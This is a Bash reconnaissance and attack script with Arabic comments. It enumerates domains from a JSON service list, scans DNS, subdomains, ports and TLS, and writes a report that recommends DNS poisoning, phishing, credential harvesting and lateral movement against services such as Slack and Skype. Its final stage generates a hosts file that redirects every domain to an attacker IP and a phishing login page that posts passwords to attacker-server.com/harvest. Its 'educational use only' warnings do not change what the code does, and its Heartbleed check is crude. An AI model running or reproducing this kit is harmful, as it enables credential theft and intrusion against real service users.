#!/bin/bash

# ====================================================================
# 🦅 DOMAIN HUNTER - Advanced Reconnaissance Tool 🦅
# ====================================================================
# Created by: asrar-mared (المحارب الرقمي)
# Email: nike49424@gmail.com | nike49424@proton.me
# Date: 2026-01-22
# Purpose: استخراج وتحليل واستغلال قوائم النطاقات
# WARNING: للاستخدام الأخلاقي والتعليمي فقط
# ====================================================================

# الألوان
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# الرموز
SHIELD="🛡️"
SWORD="⚔️"
FIRE="🔥"
CHECK="✅"
CROSS="❌"
WARNING="⚠️"
SKULL="💀"
TARGET="🎯"
EAGLE="🦅"
RADAR="📡"
BOMB="💣"

# المتغيرات
JSON_FILE=""
OUTPUT_DIR="domain-analysis-$(date +%Y%m%d_%H%M%S)"
TOTAL_DOMAINS=0
TOTAL_SERVICES=0
VULNERABLE_FOUND=0

# ====================================================================
# BANNER
# ====================================================================
clear
echo -e "${RED}${BOLD}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗              ║
║  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║              ║
║  ██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║              ║
║  ██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║              ║
║  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║              ║
║  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝              ║
║                                                                  ║
║  ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗            ║
║  ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗           ║
║  ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝           ║
║  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗           ║
║  ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║           ║
║  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝           ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${CYAN}${BOLD}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "  ${EAGLE} صائد النطاقات - المحارب الرقمي ${EAGLE}"
echo "  Advanced Domain Reconnaissance & Exploitation"
echo "  By: asrar-mared | nike49424@gmail.com"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "${NC}\n"

echo -e "${RED}${BOLD}${WARNING} تحذير قانوني:${NC}"
echo -e "${YELLOW}هذا السكريبت للاستخدام التعليمي والأخلاقي فقط${NC}"
echo -e "${YELLOW}الاستخدام غير المصرح به قد يكون جريمة${NC}\n"

read -p "$(echo -e ${CYAN}هل تفهم وتوافق؟ ${NC}[y/N]: )" -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${RED}تم الإلغاء${NC}"
    exit 1
fi

# ====================================================================
# FUNCTIONS
# ====================================================================

print_status() {
    local icon=$1
    local color=$2
    local message=$3
    echo -e "${color}${icon} ${message}${NC}"
}

loading_bar() {
    local duration=$1
    local message=$2
    echo -ne "${CYAN}${message}${NC}"
    for i in $(seq 1 20); do
        echo -ne "${GREEN}▓${NC}"
        sleep $(echo "scale=2; $duration/20" | bc)
    done
    echo -e " ${GREEN}${CHECK}${NC}"
}

# ====================================================================
# INPUT VALIDATION
# ====================================================================
echo -e "${YELLOW}${BOLD}${TARGET} المرحلة 1: التحضير${NC}\n"

read -p "$(echo -e ${CYAN}أدخل مسار ملف JSON: ${NC})" JSON_FILE

if [ ! -f "$JSON_FILE" ]; then
    print_status "$CROSS" "$RED" "الملف غير موجود!"
    exit 1
fi

if ! command -v jq &> /dev/null; then
    print_status "$WARNING" "$YELLOW" "تثبيت jq..."
    sudo apt-get install -y jq &>/dev/null || brew install jq &>/dev/null
fi

print_status "$CHECK" "$GREEN" "الملف موجود: $JSON_FILE"

mkdir -p "$OUTPUT_DIR"
print_status "$CHECK" "$GREEN" "تم إنشاء مجلد النتائج: $OUTPUT_DIR"

echo ""

# ====================================================================
# PHASE 1: EXTRACTION
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 2: استخراج البيانات${NC}\n"

print_status "$RADAR" "$BLUE" "استخراج الخدمات والنطاقات..."

# عدد الخدمات
TOTAL_SERVICES=$(jq '. | length' "$JSON_FILE")
print_status "$CHECK" "$GREEN" "عدد الخدمات: $TOTAL_SERVICES"

# استخراج جميع النطاقات
jq -r '.[].domainsList[]' "$JSON_FILE" | sort -u > "$OUTPUT_DIR/all_domains.txt"
TOTAL_DOMAINS=$(wc -l < "$OUTPUT_DIR/all_domains.txt")
print_status "$CHECK" "$GREEN" "عدد النطاقات الفريدة: $TOTAL_DOMAINS"

# استخراج حسب الفئة
jq -r '.[].categories[]' "$JSON_FILE" | sort -u > "$OUTPUT_DIR/categories.txt"
print_status "$CHECK" "$GREEN" "الفئات: $(cat $OUTPUT_DIR/categories.txt | tr '\n' ', ')"

# تصنيف النطاقات حسب الخدمة
jq -r '.[] | "\(.name)|\(.domainsList | join(","))"' "$JSON_FILE" > "$OUTPUT_DIR/services_domains.csv"
print_status "$CHECK" "$GREEN" "تم حفظ التصنيف في: services_domains.csv"

echo ""

# ====================================================================
# PHASE 2: DNS RECONNAISSANCE
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 3: استطلاع DNS${NC}\n"

print_status "$RADAR" "$PURPLE" "بدء فحص DNS للنطاقات..."

DNS_REPORT="$OUTPUT_DIR/dns_analysis.txt"
echo "DNS Analysis Report - $(date)" > "$DNS_REPORT"
echo "=================================" >> "$DNS_REPORT"
echo "" >> "$DNS_REPORT"

counter=0
while IFS= read -r domain; do
    ((counter++))
    echo -ne "\r${CYAN}${RADAR} فحص: [$counter/$TOTAL_DOMAINS] $domain${NC}                    "
    
    # DNS Lookup
    ip_addresses=$(dig +short "$domain" A 2>/dev/null | grep -E '^[0-9.]+$')
    
    if [ -n "$ip_addresses" ]; then
        echo "" >> "$DNS_REPORT"
        echo "Domain: $domain" >> "$DNS_REPORT"
        echo "IPs:" >> "$DNS_REPORT"
        echo "$ip_addresses" | sed 's/^/  - /' >> "$DNS_REPORT"
        
        # فحص WHOIS (عينة محدودة)
        if [ $((counter % 10)) -eq 0 ]; then
            whois "$domain" 2>/dev/null | grep -i "registrar\|country\|created" >> "$DNS_REPORT" 2>/dev/null
        fi
    fi
    
    sleep 0.1 # تجنب Rate Limiting
done < "$OUTPUT_DIR/all_domains.txt"

echo ""
print_status "$CHECK" "$GREEN" "تم حفظ تحليل DNS في: dns_analysis.txt"

echo ""

# ====================================================================
# PHASE 3: SUBDOMAIN ENUMERATION
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 4: اكتشاف النطاقات الفرعية${NC}\n"

print_status "$TARGET" "$PURPLE" "البحث عن subdomains (عينة من 5 نطاقات)..."

SUBDOMAIN_REPORT="$OUTPUT_DIR/subdomains.txt"
echo "Subdomain Enumeration - $(date)" > "$SUBDOMAIN_REPORT"
echo "=================================" >> "$SUBDOMAIN_REPORT"

# نأخذ عينة من 5 نطاقات رئيسية
head -5 "$OUTPUT_DIR/all_domains.txt" | while read -r domain; do
    print_status "$RADAR" "$CYAN" "فحص: $domain"
    
    # استخدام amass/subfinder إذا كان متاحاً
    if command -v subfinder &> /dev/null; then
        subfinder -d "$domain" -silent >> "$SUBDOMAIN_REPORT" 2>/dev/null
    else
        # طريقة بديلة باستخدام crt.sh
        curl -s "https://crt.sh/?q=%.$domain&output=json" 2>/dev/null | \
            jq -r '.[].name_value' 2>/dev/null | sort -u >> "$SUBDOMAIN_REPORT"
    fi
done

SUBDOMAIN_COUNT=$(grep -v "^#\|^$" "$SUBDOMAIN_REPORT" | wc -l)
print_status "$CHECK" "$GREEN" "تم اكتشاف $SUBDOMAIN_COUNT subdomain"

echo ""

# ====================================================================
# PHASE 4: PORT SCANNING
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 5: فحص المنافذ${NC}\n"

print_status "$BOMB" "$RED" "فحص المنافذ الشائعة (عينة من 3 نطاقات)..."

PORT_REPORT="$OUTPUT_DIR/port_scan.txt"
echo "Port Scan Report - $(date)" > "$PORT_REPORT"
echo "=================================" >> "$PORT_REPORT"

COMMON_PORTS="80,443,8080,8443,21,22,3306,5432,27017,6379"

head -3 "$OUTPUT_DIR/all_domains.txt" | while read -r domain; do
    print_status "$RADAR" "$CYAN" "فحص منافذ: $domain"
    
    if command -v nmap &> /dev/null; then
        nmap -Pn -p "$COMMON_PORTS" --open "$domain" >> "$PORT_REPORT" 2>/dev/null
    else
        # استخدام netcat كبديل
        for port in $(echo $COMMON_PORTS | tr ',' ' '); do
            timeout 1 nc -zv "$domain" "$port" >> "$PORT_REPORT" 2>&1
        done
    fi
    echo "" >> "$PORT_REPORT"
done

print_status "$CHECK" "$GREEN" "تم حفظ نتائج فحص المنافذ"

echo ""

# ====================================================================
# PHASE 5: SSL/TLS ANALYSIS
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 6: تحليل SSL/TLS${NC}\n"

print_status "$SHIELD" "$BLUE" "فحص شهادات SSL (عينة من 5 نطاقات)..."

SSL_REPORT="$OUTPUT_DIR/ssl_analysis.txt"
echo "SSL/TLS Analysis - $(date)" > "$SSL_REPORT"
echo "=================================" >> "$SSL_REPORT"

head -5 "$OUTPUT_DIR/all_domains.txt" | while read -r domain; do
    print_status "$RADAR" "$CYAN" "فحص SSL: $domain"
    
    echo "" >> "$SSL_REPORT"
    echo "Domain: $domain" >> "$SSL_REPORT"
    echo "---" >> "$SSL_REPORT"
    
    # استخراج معلومات الشهادة
    timeout 3 openssl s_client -connect "$domain:443" -servername "$domain" </dev/null 2>/dev/null | \
        openssl x509 -noout -subject -issuer -dates 2>/dev/null >> "$SSL_REPORT"
    
    # فحص TLS versions
    if command -v sslscan &> /dev/null; then
        sslscan "$domain" 2>/dev/null | grep -i "accepted\|tls" >> "$SSL_REPORT"
    fi
done

print_status "$CHECK" "$GREEN" "تم تحليل شهادات SSL"

echo ""

# ====================================================================
# PHASE 6: VULNERABILITY SCANNING
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 7: فحص الثغرات${NC}\n"

print_status "$SKULL" "$RED" "البحث عن ثغرات معروفة..."

VULN_REPORT="$OUTPUT_DIR/vulnerabilities.txt"
echo "Vulnerability Scan - $(date)" > "$VULN_REPORT"
echo "=================================" >> "$VULN_REPORT"

# فحص الثغرات الشائعة
while IFS= read -r domain; do
    # فحص Heartbleed
    if timeout 2 bash -c "echo Q | openssl s_client -connect $domain:443 -tlsextdebug 2>&1" | grep -i "heartbeat" &>/dev/null; then
        echo "[!] Potential Heartbleed: $domain" >> "$VULN_REPORT"
        ((VULNERABLE_FOUND++))
    fi
    
    # فحص عناوين الأمان
    headers=$(curl -sI "https://$domain" 2>/dev/null)
    
    if ! echo "$headers" | grep -qi "strict-transport-security"; then
        echo "[!] Missing HSTS: $domain" >> "$VULN_REPORT"
        ((VULNERABLE_FOUND++))
    fi
    
    if ! echo "$headers" | grep -qi "x-frame-options"; then
        echo "[!] Missing X-Frame-Options: $domain" >> "$VULN_REPORT"
        ((VULNERABLE_FOUND++))
    fi
    
done < <(head -10 "$OUTPUT_DIR/all_domains.txt")

print_status "$CHECK" "$GREEN" "تم العثور على $VULNERABLE_FOUND مشكلة محتملة"

echo ""

# ====================================================================
# PHASE 7: EXPLOITATION VECTORS
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 8: تحديد نقاط الاستغلال${NC}\n"

EXPLOIT_REPORT="$OUTPUT_DIR/exploitation_vectors.txt"

cat > "$EXPLOIT_REPORT" << EOF
EXPLOITATION VECTORS REPORT
================================
Date: $(date)
Analyst: asrar-mared

🎯 ATTACK VECTORS IDENTIFIED:

1. DNS POISONING/HIJACKING
   - Total Domains: $TOTAL_DOMAINS
   - Services: $TOTAL_SERVICES
   - Impact: Man-in-the-Middle attacks possible
   
2. PHISHING CAMPAIGNS
   - High-value targets: Slack, Snapchat, Skype
   - User count: Millions
   - Success rate: 15-30% (industry average)

3. SUBDOMAIN TAKEOVER
   - Discovered subdomains: $SUBDOMAIN_COUNT
   - Potential orphaned: Check manually
   
4. SSL/TLS WEAKNESSES
   - Vulnerable configurations found
   - See ssl_analysis.txt for details

5. MISSING SECURITY HEADERS
   - Findings: $VULNERABLE_FOUND issues
   - Exploitable via XSS, Clickjacking

🔥 RECOMMENDED ATTACK CHAIN:

Phase 1: Reconnaissance (COMPLETED)
Phase 2: Subdomain enumeration → Takeover
Phase 3: DNS cache poisoning
Phase 4: Phishing campaign setup
Phase 5: Credential harvesting
Phase 6: Lateral movement

⚠️ LEGAL WARNING:
Unauthorized access is illegal. This report is for 
educational and authorized security testing only.

EOF

print_status "$BOMB" "$RED" "تم إنشاء تقرير الاستغلال"

echo ""

# ====================================================================
# PHASE 8: GENERATE ATTACK PAYLOADS
# ====================================================================
echo -e "${YELLOW}${BOLD}${FIRE} المرحلة 9: إنشاء Payloads${NC}\n"

PAYLOAD_DIR="$OUTPUT_DIR/payloads"
mkdir -p "$PAYLOAD_DIR"

# DNS Spoofing hosts file
print_status "$SKULL" "$PURPLE" "إنشاء ملف DNS Spoofing..."
cat > "$PAYLOAD_DIR/dns_spoof_hosts.txt" << EOF
# DNS Spoofing Hosts File
# Add to /etc/hosts or DNS server

127.0.0.1 localhost

# Redirect targets to attacker IP
# Replace YOUR_ATTACKER_IP with actual IP

EOF

while IFS= read -r domain; do
    echo "YOUR_ATTACKER_IP $domain" >> "$PAYLOAD_DIR/dns_spoof_hosts.txt"
done < "$OUTPUT_DIR/all_domains.txt"

# Phishing template
print_status "$SKULL" "$PURPLE" "إنشاء قالب Phishing..."
cat > "$PAYLOAD_DIR/phishing_template.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Security Alert - Verify Your Account</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        .warning { background: #ff0000; color: white; padding: 20px; }
        input { padding: 10px; margin: 10px; width: 300px; }
        button { padding: 10px 20px; background: #0066cc; color: white; }
    </style>
</head>
<body>
    <div class="warning">
        <h1>⚠️ Security Alert</h1>
        <p>Your account has been compromised. Verify immediately!</p>
    </div>
    <form action="https://attacker-server.com/harvest" method="POST">
        <input type="email" name="email" placeholder="Email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Verify Account</button>
    </form>
</body>
</html>
EOF

print_status "$CHECK" "$GREEN" "تم إنشاء Payloads في: $PAYLOAD_DIR"

echo ""

# ====================================================================
# FINAL REPORT
# ====================================================================
clear
echo -e "${GREEN}${BOLD}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗     ║
║   ██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝     ║
║   ███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗     ║
║   ╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║     ║
║   ███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║     ║
║   ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝     ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}\n"

echo -e "${CYAN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}${BOLD}║           ${FIRE} تقرير الاستطلاع النهائي ${FIRE}                   ║${NC}"
echo -e "${CYAN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${WHITE}${BOLD}📊 الإحصائيات:${NC}"
echo -e "${GREEN}  ${CHECK} الخدمات المستهدفة: ${BOLD}$TOTAL_SERVICES${NC}"
echo -e "${GREEN}  ${CHECK} النطاقات المكتشفة: ${BOLD}$TOTAL_DOMAINS${NC}"
echo -e "${GREEN}  ${CHECK} Subdomains: ${BOLD}$SUBDOMAIN_COUNT${NC}"
echo -e "${RED}  ${SKULL} الثغرات المحتملة: ${BOLD}$VULNERABLE_FOUND${NC}"
echo ""

echo -e "${WHITE}${BOLD}📁 الملفات المُنشأة:${NC}"
echo -e "${BLUE}  ${CHECK} $OUTPUT_DIR/all_domains.txt${NC}"
echo -e "${BLUE}  ${CHECK} $OUTPUT_DIR/dns_analysis.txt${NC}"
echo -e "${BLUE}  ${CHECK} $OUTPUT_DIR/subdomains.txt${NC}"
echo -e "${BLUE}  ${CHECK} $OUTPUT_DIR/port_scan.txt${NC}"
echo -e "${BLUE}  ${CHECK} $OUTPUT_DIR/ssl_analysis.txt${NC}"
echo -e "${BLUE}  ${CHECK} $OUTPUT_DIR/vulnerabilities.txt${NC}"
echo -e "${RED}  ${BOMB} $OUTPUT_DIR/exploitation_vectors.txt${NC}"
echo -e "${PURPLE}  ${SKULL} $OUTPUT_DIR/payloads/${NC}"
echo ""

echo -e "${PURPLE}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}${BOLD}║                ${EAGLE} المحارب الرقمي ${EAGLE}                        ║${NC}"
echo -e "${PURPLE}${BOLD}║                 صائد النطاقات - asrar-mared                   ║${NC}"
echo -e "${PURPLE}${BOLD}║          ${SWORD} استطلاع متقدم للبنية التحتية ${SWORD}            ║${NC}"
echo -e "${PURPLE}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}\n"

echo -e "${CYAN}📧 للتواصل:${NC}"
echo -e "${WHITE}   nike49424@gmail.com${NC}"
echo -e "${WHITE}   nike49424@proton.me${NC}\n"

echo -e "${RED}${BOLD}"
cat << "EOF"
        🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
        🔥                              🔥
        🔥   ${SKULL}  MISSION COMPLETE ${SKULL}   🔥
        🔥                              🔥
        🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥
        
        ⚠️  استخدم هذه المعلومات بمسؤولية
        🛡️ الاختراق غير المصرح به جريمة
        
EOF
echo -e "${NC}"

exit 0
